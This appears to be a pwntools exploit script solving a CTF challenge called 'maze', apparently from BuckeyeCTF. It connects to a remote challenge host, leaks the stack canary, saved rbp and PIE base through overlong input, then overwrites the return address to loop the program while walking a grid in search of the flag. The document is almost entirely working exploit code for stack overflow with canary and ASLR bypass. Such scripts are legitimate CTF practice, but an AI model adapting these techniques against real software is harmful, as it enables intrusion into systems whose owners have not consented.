from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                [elf_name, "bctf{REDUCTED}"], script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(
            [elf_name, "bctf{REDUCTED}"], env={"LD_PRELOAD": libc_name}
        )
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    def safe_move(dist: bytes):
        if False:  # buf := t.recvuntil(b"(")[:-1].strip():
            crash_words = [
                b"ribbity",
                b"the frog...",
                b"slurp",
                b"everything is light",
                b"it is crushing",
                b"intense heat",
            ]
            did_crash = False
            for crash in crash_words:
                if crash in buf:
                    warn("!! CRASH !!")
                    did_crash = True
            if not did_crash:
                info(f"{buf=}")
            global found
            if b"bctf" in buf:
                success(buf)
                found = True
                input("Flag found!!!")
        #     for word in crash_words:
        #         if word in buf:
        #             info(f"trap! {buf}")
        #             msg = dist + b"A" * 4 + p64(canary) + p64(rbp - 0x40) + loop_addr
        #             if b"\x0a" in msg:
        #                 raise Exception("invalid bytes. try again.")
        #             t.sendline(msg)
        #             t.recvuntil(b"Invalid input")
        #             t.recvline()
        # # sleep(0.1)
        # else:
        msg = dist + b"A" * 4 + p64(canary) + fake_rbp + ret + loop_addr
        if b"\x0a" in msg:
            raise Exception("invalid bytes. try again.")
        t.send(msg)

    def do_search():
        info(f"{x=:x} {y=:x}")
        assert x == 0x18 or x == 0x177
        assert y == 0x18 or y == 0x177

        x_dist = b"a" if x == 0x18 else b"d"
        y_dist = b"w" if y == 0x18 else b"s"
        for cur_x in range(0x18):
            for _ in range(0x18):
                safe_move(y_dist)
            y_dist = b"w" if y_dist == b"s" else b"s"
            safe_move(x_dist)
            if b"bctf" in t.recv():
                success("Flag Found!!")
                input("...")
        raise Exception("no flag found here")

    # leak canary & rbp
    sla(b")\n", b"A" * 6)
    buf = t.recvuntil(b"\n(")[:-2]
    buf = buf[buf.find(b"AAAAAA") + 5 :]
    canary, rbp = buf[:8], buf[8:]
    canary = s2u64(canary) & ~0xFF
    rbp = s2u64(rbp)
    success(f"{canary=:x}")
    success(f"{rbp=:x}")

    # get X,Y
    cur = t.recvuntil(b")")[:-1]
    x, y = list(map(int, cur.split(b", ")))
    success(f"{x=} {y=}")

    # leak pie base
    t.sendline(b"A" * 5 + b"B" * 8 + b"C" * 8)
    buf = t.recvuntil(b"\n(")[:-2]
    buf = buf[buf.find(b"C" * 8) + 8 :]
    pie_base = s2u64(buf) - 0x3431
    success(f"{pie_base=:x}")
    assert not pie_base & 0xFFF

    fake_rbp = p64(rbp - 0x280)
    loop_addr = p64(pie_base + 0x2F7A)
    ret = p64(pie_base + 0x12B8)
    t.send(b"A" * 5 + p64(canary + 2) + fake_rbp + ret + loop_addr)
    t.recvuntil(b"Invalid input")
    t.recvline()

    # Go corner
    x_dist = b"a" if x < 0x18F - x else b"d"
    x_times = min(x - 0x18, 0x177 - x)
    info(f"{x:x} {'-' if x_dist==b'a' else '+'} {x_times:x}")

    y_dist = b"w" if y < 0x18F - y else b"s"
    y_times = min(y - 0x18, 0x177 - y)
    info(f"{y:x} {'-' if y_dist=='w' else '+':} {y_times:x}")

    cnt = 0
    for _ in range(x_times):
        safe_move(x_dist)
        x += -1 if x_dist == b"a" else 1
    for _ in range(y_times):
        safe_move(y_dist)
        y += -1 if y_dist == b"w" else 1

    do_search()
    t.interactive()

    # t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./maze"
libc_name = ""
remote_addr, remote_port = "chall.pwnoh.io 13387".split()
elf: ELF = ELF(elf_name)
# libc: ELF = ELF(libc_name)
script = """
b *0x555555554000+0x30de
b *0x555555554000+0x2920
"""
found = False
for _ in range(0x300):
    if found:
        break
    t = create_io()
    try:
        solve()
    except Exception as e:
        warn(e)
        if debug:
            input("debugging...")
    finally:
        t.close()
